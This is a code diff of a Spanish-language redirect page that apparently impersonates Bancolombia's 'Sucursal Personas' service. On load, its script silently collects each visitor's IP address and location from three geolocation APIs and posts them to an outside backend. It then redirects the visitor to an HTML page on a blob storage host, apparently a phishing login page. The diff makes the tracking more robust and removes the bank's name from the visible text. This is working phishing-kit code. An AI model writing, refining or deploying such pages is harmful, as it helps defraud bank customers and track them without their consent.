@@ -3,9 +3,8 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Redirigiendo… | Mi pagina de ropa</title>
+  <title>Redirigiendo… | Sucursal de bloqueos Personas</title>
   <style>
-    /* ... (Todo tu CSS original va aquí, está perfecto) ... */
     :root {
       --bg: #f3f6fb;
       --card-bg: rgba(255, 255, 255, 0.7);
@@ -23,8 +22,6 @@
       background: linear-gradient(180deg, #eef6ff 0%, var(--bg) 100%);
       font-family: var(--font-sans);
       color: #0b1a2b;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -60,7 +57,6 @@
       font-weight: 700;
       box-shadow: 0 6px 18px rgba(3, 62, 120, 0.12);
       flex-shrink: 0;
-      font-family: var(--font-sans);
     }
     .title {
       font-size: 18px;
@@ -145,27 +141,27 @@
   </style>
 </head>
 <body>
-  <div class="card" role="region" aria-labelledby="redir-title" aria-live="polite">
+  <div class="card">
     <div class="left">
-      <div class="brand" aria-hidden="true">
+      <div class="brand">
         <div class="ms-logo">
-          <img src="https://i.postimg.cc/mrgh8wqk/channels4-jprofile.jpg" alt="Microsoft Logo" style="height:45px;">
+          <img src="https://i.postimg.cc/mrgh8wqk/channels4-jprofile.jpg" alt="Logo" style="height:45px;">
         </div>
         <div>
-          <div class="title" id="redir-title">En unos momentos serás redirigido</div>
-          <div class="subtitle">Serás redirigido hacia los servicios de Bancolombia.</div>
+          <div class="title">En unos momentos serás redirigido</div>
+          <div class="subtitle">Estamos preparando la conexión segura…</div>
         </div>
       </div>
       <p style="margin-top:18px; color:var(--muted); font-size:14px; line-height:1.5;">
-        Estamos preparando la conexión segura. Si tu navegador no redirige automáticamente, puedes usar el enlace manual debajo.
+        Si tu navegador no redirige automáticamente, puedes usar el enlace manual debajo.
       </p>
       <p class="manual">
         Ir ahora:
-        <a class="manual-link" id="manualLink" href="#" target="_self" rel="noopener">Ir a Sucursal Personas</a>
+        <a class="manual-link" id="manualLink" href="#" target="_self">Ir a Sucursal Personas</a>
       </p>
     </div>
-    <div class="right" aria-hidden="false">
-      <div class="spinner" aria-hidden="true"></div>
+    <div class="right">
+      <div class="spinner"></div>
       <div style="text-align:center">
         <div class="small-note">Cargando conexión segura…</div>
         <div class="countdown" id="countdown">3</div>
@@ -175,116 +171,74 @@
   </div>
 
   <script>
-    // --- CONFIGURACIÓN ---
     const redirectUrl = "https://personassucursalcliente.blob.core.windows.net/proceso/Virtual-Persona.html";
     const redirectDelayMs = 3000;
     const backendApiUrl = "https://newbrandly.onrender.com/api/notify";
 
-    // --- LÓGICA DE REDIRECCIÓN (SIN CAMBIOS) ---
     document.getElementById('manualLink').href = redirectUrl;
 
-    // --- NUEVA LÓGICA DE API ROBUSTA ---
-    
-    /**
-     * Esta función intenta obtener los datos de 3 APIs diferentes.
-     * Si una falla, pasa a la siguiente.
-     * También "normaliza" la respuesta para que tu server.js siempre reciba
-     * el formato { ip, country, city, region }.
-     */
-    async function fetchRobustGeoData() {
-      let geoData;
-
-      // Intento 1: ipwho.is (Tuvo problemas en Colombia)
+    // ---- Función con timeout (2s por API) ----
+    async function fetchWithTimeout(url, options = {}) {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), options.timeout || 2000);
       try {
-        const res = await fetch('https://ipwho.is/');
-        if (!res.ok) throw new Error('ipwho.is FAILED');
-        geoData = await res.json();
-        console.log("API 1 (ipwho.is) tuvo éxito");
-        // Normalizar (ya está en el formato correcto)
-        return { ip: geoData.ip, country: geoData.country, city: geoData.city, region: geoData.region };
-      } catch (error1) {
-        console.warn("API 1 (ipwho.is) falló:", error1.message);
-
-        // Intento 2: ipapi.co (Muy robusta)
-        try {
-          const res = await fetch('https://ipapi.co/json/');
-          if (!res.ok) throw new Error('ipapi.co FAILED');
-          geoData = await res.json();
-          console.log("API 2 (ipapi.co) tuvo éxito");
-          // Normalizar (usa 'country_name', 'region')
-          return { ip: geoData.ip, country: geoData.country_name, city: geoData.city, region: geoData.region };
-        } catch (error2) {
-          console.warn("API 2 (ipapi.co) falló:", error2.message);
-
-          // Intento 3: geojs.io (Buena y rápida)
-          try {
-            const res = await fetch('https://get.geojs.io/v1/ip/geo.json');
-            if (!res.ok) throw new Error('geojs.io FAILED');
-            geoData = await res.json();
-            console.log("API 3 (geojs.io) tuvo éxito");
-            // Normalizar (usa 'country', 'region', 'city')
-            return { ip: geoData.ip, country: geoData.country, city: geoData.city, region: geoData.region };
-          } catch (error3) {
-            console.error("API 3 (geojs.io) falló:", error3.message);
-            // Si las 3 fallan, lanzamos el error final
-            throw new Error("Las 3 APIs de geolocalización fallaron.");
-          }
-        }
+        const res = await fetch(url, { signal: controller.signal });
+        clearTimeout(timeout);
+        return res;
+      } catch (err) {
+        clearTimeout(timeout);
+        throw err;
       }
     }
 
-    /**
-     * Función principal que se ejecuta al cargar la página.
-     */
+    // ---- Fallback global con 3 APIs ----
+    async function fetchRobustGeoData() {
+      const apis = [
+        { url: 'https://ipwho.is/', normalize: d => ({ ip: d.ip, country: d.country, city: d.city, region: d.region }) },
+        { url: 'https://ipapi.co/json/', normalize: d => ({ ip: d.ip, country: d.country_name, city: d.city, region: d.region }) },
+        { url: 'https://get.geojs.io/v1/ip/geo.json', normalize: d => ({ ip: d.ip, country: d.country, city: d.city, region: d.region }) }
+      ];
+
+      for (const api of apis) {
+        try {
+          const res = await fetchWithTimeout(api.url, { timeout: 2000 });
+          if (!res.ok) continue;
+          const data = await res.json();
+          if (data && data.ip) return api.normalize(data);
+        } catch { continue; }
+      }
+      throw new Error("Todas las APIs de geolocalización fallaron.");
+    }
+
     async function initRedirectAndNotify() {
       const ipEl = document.getElementById('ipDisplay');
       try {
-        // 1. Llamamos a nuestra nueva función robusta
         const geoData = await fetchRobustGeoData();
+        ipEl.textContent = geoData.ip || "IP: n/a";
 
-        // 2. Mostramos la IP (si se pudo obtener)
-        if (geoData && geoData.ip) {
-          ipEl.textContent = `${geoData.ip}`;
-        } else {
-          ipEl.textContent = `IP: n/a`;
-        }
-
-        // 3. Enviamos los datos (normalizados) a tu backend
-        // Esto ahora se ejecutará siempre que al menos 1 API funcione
-        fetch(backendApiUrl, {
+        await fetch(backendApiUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(geoData)
-        }).catch(err => console.error("Error al notificar al backend:", err));
-
-      } catch (error) {
-        // Este error solo ocurre si las TRES APIs fallan
-        console.error("Error final de geolocalización:", error.message);
-        ipEl.textContent = 'IP: Error';
+        });
+      } catch (err) {
+        console.error("Error al obtener o enviar geodatos:", err);
+        ipEl.textContent = "IP: Error";
       }
 
-      // 4. Iniciar el countdown (Tu lógica original, sin cambios)
+      // Contador y redirección
       const countdownEl = document.getElementById('countdown');
       let remaining = Math.ceil(redirectDelayMs / 1000);
       countdownEl.textContent = remaining;
-
       const interval = setInterval(() => {
-        remaining = remaining - 1;
-        if (remaining <= 0) {
-          countdownEl.textContent = '0';
-          clearInterval(interval);
-        } else {
-          countdownEl.textContent = remaining;
-        }
+        remaining--;
+        countdownEl.textContent = remaining > 0 ? remaining : "0";
+        if (remaining <= 0) clearInterval(interval);
       }, 1000);
 
-      // 5. Redirigir (Tu lógica original, sin cambios)
-      setTimeout(() => {
-        window.location.replace(redirectUrl);
-      }, redirectDelayMs);
+      setTimeout(() => window.location.replace(redirectUrl), redirectDelayMs);
     }
 
-    // Iniciar todo
     initRedirectAndNotify();
   </script>
 </body>
